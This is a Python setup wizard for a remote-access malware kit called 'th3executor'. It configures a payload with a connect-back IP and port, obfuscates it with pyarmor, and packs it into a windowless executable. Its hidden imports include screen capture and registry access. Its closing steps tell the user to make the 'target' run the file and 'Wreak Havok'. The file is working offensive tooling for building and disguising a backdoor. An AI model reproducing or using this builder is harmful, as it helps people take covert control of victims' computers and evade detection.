"""Setup assistant for configuring and packaging the payload.

This module exposes :class:`PayloadSetup` which provides a command line
wizard used to download dependencies, configure the payload with target
connection details and optionally convert the payload to an executable.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import time
from typing import Iterable, Tuple

import ascii_art


class PayloadSetup:
    """Manage payload setup tasks such as library installation and packaging."""

    def __init__(self) -> None:
        self.server_libraries = ["pwntools", "termcolor", "pycryptodome", "uuid"]
        self.optional_libraries = ["pyarmor", "pyinstaller"]

    # --------------------------------- Utility methods ---------------------
    @staticmethod
    def _parse_pip_output(pip_output: str, library_name: str) -> str:
        """Return a human friendly message from ``pip`` output."""
        if "Successfully installed" in pip_output:
            return f"[+] Successfully installed {library_name}!"
        if "Requirement already satisfied" in pip_output:
            return f"[!] Library {library_name} already installed."
        if (
            "Defaulting to user installation because normal site-packages is"
            " not writeable" in pip_output
        ):
            return f"[!] {library_name} installed in user site-packages due to permission issues."
        return (
            f"[-] Unable to parse PIP output for {library_name}. "
            f"The below snippet log was captured : {pip_output[:40]}"
        )

    def _download_libraries(self, libraries: Iterable[str]) -> None:
        """Download the given ``pip`` libraries if missing."""
        print("[*] Checking and downloading required PIP libraries")
        for library in libraries:
            command = ["pip", "install", library]
            try:
                result = subprocess.run(command, capture_output=True, text=True)
                output = result.stdout or result.stderr
                if output:
                    print(self._parse_pip_output(output, library))
                else:
                    print(f"No output available for {library}.")
            except Exception as err:  # pylint: disable=broad-except
                print(f"[-] Unable to install {library}! Error: {err}. Skipping...")

    # ------------------------------------------------------------------
    def _payload_conversion(self, file_name: str) -> None:
        """Convert the obfuscated payload to an executable using pyinstaller."""
        os.chdir("dist")
        input_file = "payload.py"
        runtime_dir = "pyarmor_runtime_000000"
        data_path = f"{runtime_dir};." if os.name == "nt" else f"{runtime_dir}:."
        command = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name",
            file_name,
            "--hidden-import",
            "Crypto",
            "--hidden-import",
            "Crypto.Util.number",
            "--hidden-import",
            "Crypto.Protocol.KDF",
            "--hidden-import",
            "Crypto.Hash",
            "--hidden-import",
            "Crypto.Cipher.ChaCha20",
            "--hidden-import",
            "Crypto.Random",
            "--hidden-import",
            "socket",
            "--hidden-import",
            "time",
            "--hidden-import",
            "platform",
            "--hidden-import",
            "subprocess",
            "--hidden-import",
            "pickle",
            "--hidden-import",
            "winreg",
            "--hidden-import",
            "sys",
            "--hidden-import",
            "PIL.ImageGrab",
            "--add-data",
            data_path,
            input_file,
        ]
        print(
            f"[!] Processing the conversion of '{file_name}'. "
            "Please stand by, this may take some time."
        )
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            print(
                f"[+] Payload file has been converted to {file_name} "
                "and is now an executable."
            )
        else:
            raise RuntimeError(result.stderr)
        os.chdir("..")

    # ------------------------------------------------------------------
    def _obscure_code(self) -> None:
        """Obfuscate the payload code using pyarmor."""
        if not os.path.exists("payload.py"):
            print(
                "[-] Unable to find 'payload.py'. Please ensure this file "
                "is inside your 'th3executor' directory. Exiting!"
            )
            return
        command = ["pyarmor", "gen", "payload.py"]
        try:
            result = subprocess.run(
                command,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if result.returncode == 0:
                print("[+] Code obfuscation completed successfully.")
            else:
                print(f"[-] An error occurred during the obfuscation process: {result.stderr}")
        except subprocess.CalledProcessError as exc:
            print(f"[-] An error occurred while running PyArmor : {exc}")

    # ------------------------------------------------------------------
    @staticmethod
    def _banner() -> None:
        print(ascii_art.oberon_setup_banner_1 + "\n")

    @staticmethod
    def _main_menu_banner() -> None:
        print(ascii_art.oberon_setup_banner_2)

    def _clear_screen_banner(self, intro_message: str) -> None:
        if os.name == "nt":
            os.system("cls")
        else:
            subprocess.run(["clear"], shell=True, check=True)
        self._banner()
        print(f"-> {intro_message} <-")

    @staticmethod
    def _validate_ip_and_port(ip_addr: str, port: str) -> Tuple[bool, bool]:
        ip_regex = (
            r"^((192\.168|10)\.\d{1,3}\.\d{1,3}|"
            r"172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3})$"
        )
        ip_check = re.match(ip_regex, ip_addr) is not None
        port_check = port.isdigit() if isinstance(port, str) else False
        return ip_check, port_check

    # ------------------------------------------------------------------
    def _display_main_menu(self) -> None:
        menu_options = {
            "1": "Full Installation and Checks - Install all required libraries and perform initial checks (Recommended for first usage)",
            "2": "Library Check and Installation - Verify and install necessary libraries only",
            "3": "Payload Configuration - Define the target and local information for the payload only",
            "4": "Executable Configuration - Set up options for payload conversion to executable format only",
        }
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        self._main_menu_banner()
        print("Select one of the following options to proceed:\n")
        for key in sorted(menu_options):
            print(f"{key}) {menu_options[key]}")

    # ------------------------------------------------------------------
    def _libraries_check_section(self, libraries: Iterable[str]) -> None:
        self._clear_screen_banner("Installation Procedure")
        print("PIP LIBRARY SERVER INSTALLATION - Downloading required libraries . . . \n")
        self._download_libraries(libraries)
        print("\nLIBRARY INSTALLATION COMPLETED")

    # ------------------------------------------------------------------
    def _payload_configuration_section(self) -> None:
        self._clear_screen_banner("Payload Options Setup")
        print("PAYLOAD INITILIZATION - Define the target and local information . . . \n")
        while True:
            print("Local Host - Define an IP that the payload will connect to")
            ip_input = input("IP Address > ").strip()
            print("Local Port - Define an open port to listen on (payload will use this port also): ")
            port_input = input("Port Number > ").strip()
            ip_ok, port_ok = self._validate_ip_and_port(ip_input, port_input)
            if not ip_ok:
                print("\n[-] Invalid IP address, please try again ensuring the proper format!")
            elif not port_ok:
                print("\n[-] Invalid port number, please ensure data entered is numeric!")
            else:
                break
        print()
        self._update_ip_port_in_payload(ip_input, port_input)
        print("\nPAYLOAD SETTINGS COMPLETED")

    # ------------------------------------------------------------------
    def _executable_configuration_section(self) -> None:
        self._clear_screen_banner("Executable Options Setup")
        print("PAYLOAD CONFIGURATION - Convert the payload file to a more runnable format . . . \n")
        print(
            "[!] Conversion limitations are determined by your OS, this is not a program limitation but a library limitation used"
        )
        if os.name == "nt":
            print("[+] Payload can be converted to '.exe' windows format!")
        else:
            print("[+] Payload can be converted to a Linux executable format! (!Ensure you are a root user in the process!)")
        print()
        print(
            "Converting the payload to an executable requires the 'pyinstaller' and 'pyarmour' library, install and continue?"
        )
        yes_no_userinput = input("Input (y/n) > ").lower().strip()
        if yes_no_userinput == "y":
            print()
            self._download_libraries(self.optional_libraries)
            print()
            print("Enter the name of your custom file")
            file_name = input("Executable Name > ").lower().strip() or "executor_exe"
        else:
            raise SystemExit(
                "Aborted. Setup complete, Run the main program with 'python3 th3executor.py'"
            )
        print("\nEXECUTABLE CONFIGURATION COMPLETED - Preparing to compile payload")
        time.sleep(3)
        # Obfuscate then convert
        self._clear_screen_banner("Obfuscate payload & Convert")
        if os.name != "nt":
            print("[!] ! Ensure you are a root user in the process ! This process will fail if you arent")
        print("PAYLOAD SCRAMBLER - Attempting to disguise/obfuscate payload . . . \n")
        print("[!] Proceeding to compile and scramble the payload python file . . .")
        self._obscure_code()
        print()
        print("PAYLOAD CONVERSTION - Attempting to convert payload . . . \n")
        self._payload_conversion(file_name)
        print("[+] Payload successfully obscured and encoded!")
        print()
        print("DIRECTORY CLEANING - Attempting to clean left over files . . . \n")
        self._clean_directory(file_name)
        print("\nENCODING AND CONVERSION COMPLETED")

    # ------------------------------------------------------------------
    def _setup_exit_section(self) -> None:
        self._clear_screen_banner("Setup Complete!")
        print("Th3Executor Setup Completed! Steps to follow :")
        print(
            """      > Ensure target runs the converted executable file
        > Run the 'th3executor' server script
        > Seamlessly connect to the target
        > EXECUTE and Wreak Havok"""
        )
        raise SystemExit(
            "\nYou may now run 'python3 th3executor.py' to start th3executor on your local machine, Goodbye!"
        )

    # ------------------------------------------------------------------
    def _update_ip_port_in_payload(self, ip: str, port: str) -> None:
        file_path_payload = "payload.py"
        file_path_main = "th3executor.py"
        if not os.path.exists(file_path_payload):
            print(
                f"[-] The file '{file_path_payload}' does not exist! Ensure you have {file_path_payload} in your current directory. Skipping options!"
            )
            return
        if not os.path.exists(file_path_main):
            print(
                f"[-] The file '{file_path_main}' does not exist! Ensure you have {file_path_main} in your current directory. Skipping options!"
            )
            return
        self._update_file(file_path_payload, f"srv_ip, srv_port = '{ip}', {port}", "srv_ip, srv_port")
        self._update_file(file_path_main, f"port = {port}", "port =")

    def _update_file(self, file_path: str, new_content: str, variable_names: str) -> None:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
        comment = "# SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)"
        for i, line in enumerate(lines):
            if variable_names in line and comment in line:
                parts = line.split("#")
                lines[i] = f"{new_content} # {parts[1].strip()}\n"
                with open(file_path, "w", encoding="utf-8") as file_write:
                    file_write.writelines(lines)
                print(f"[+] {file_path} updated successfully with the new content.")
                break
        else:
            print(
                f"[-] Unable to find line to update in {file_path}. No updates made, please do this manually (refer to source code comments)"
            )

    # ------------------------------------------------------------------
    def _clean_directory(self, file_name: str) -> None:
        base_path = os.path.abspath("dist")
        executable_extension = ".exe" if os.name == "nt" else ""
        executable_file = f"{file_name}{executable_extension}"

        def safe_remove(path: str) -> None:
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
            except Exception as exc:  # pylint: disable=broad-except
                print(f"[-] Failed to delete {path}: {str(exc)}")

        items_to_remove = [
            "pyarmor_runtime_000000",
            f"{file_name}.spec",
            "build",
            "payload.py",
        ]
        for item in items_to_remove:
            safe_remove(os.path.join(base_path, item))
        nested_dist_path = os.path.join(base_path, "dist")
        executable_path = os.path.join(nested_dist_path, executable_file)
        target_executable_path = os.path.join(base_path, "..", executable_file)
        if os.path.exists(executable_path):
            try:
                shutil.move(executable_path, target_executable_path)
            except Exception as exc:  # pylint: disable=broad-except
                print(f"[-] Failed to move executable: {str(exc)}")
        safe_remove(nested_dist_path)
        safe_remove(base_path)
        print("[+] Directory cleanup completed!")

    # ------------------------------------------------------------------
    def run(self) -> None:
        """Entry point for the interactive setup process."""
        self._main_menu_banner()
        print(
            "[!] Notice : This setup assumes that : \n- You have not touched any of the internal source code\n- You have not modified the directory file names\n- You have the proper permissions"
        )
        print(
            "\nIf any of the above have been modified, this setup may result in issues pertaining to certain modifications"
        )
        time.sleep(2)
        input("\nPress 'enter' to continue if you understand the above . . .")
        self._display_main_menu()
        print()
        while True:
            try:
                user_choice = int(input("Choice > "))
            except KeyboardInterrupt:
                raise SystemExit("[!] Keyboard Interrupt! Exiting setup . . .")
            except ValueError:
                print("[-] Ensure input is a number! Try again \n")
                continue
            if user_choice > 6 or user_choice < 1:
                print("[-] Invalid Command, Enter a number within the range of the menu! Try again")
            else:
                print(f"\nAccessing menu choice {user_choice} . . .")
                time.sleep(1.5)
                break
        try:
            if user_choice == 1:
                self._libraries_check_section(self.server_libraries)
                time.sleep(3)
                self._payload_configuration_section()
                time.sleep(3)
                self._executable_configuration_section()
            elif user_choice == 2:
                self._libraries_check_section(self.server_libraries)
                print(
                    "Also install optional libraries used for payload obsfucration and executable conversion?"
                )
                if input("Choice (y/n) > ").lower().strip() == "y":
                    self._libraries_check_section(self.optional_libraries)
            elif user_choice == 3:
                self._payload_configuration_section()
            elif user_choice == 4:
                self._executable_configuration_section()
        except Exception as err:  # pylint: disable=broad-except
            print(
                f"An unknown error has occured during the setup process -> {err}. Please try relaunching the program or else do a full installation"
            )
        else:
            time.sleep(4)
            self._setup_exit_section()


if __name__ == "__main__":
    PayloadSetup().run()
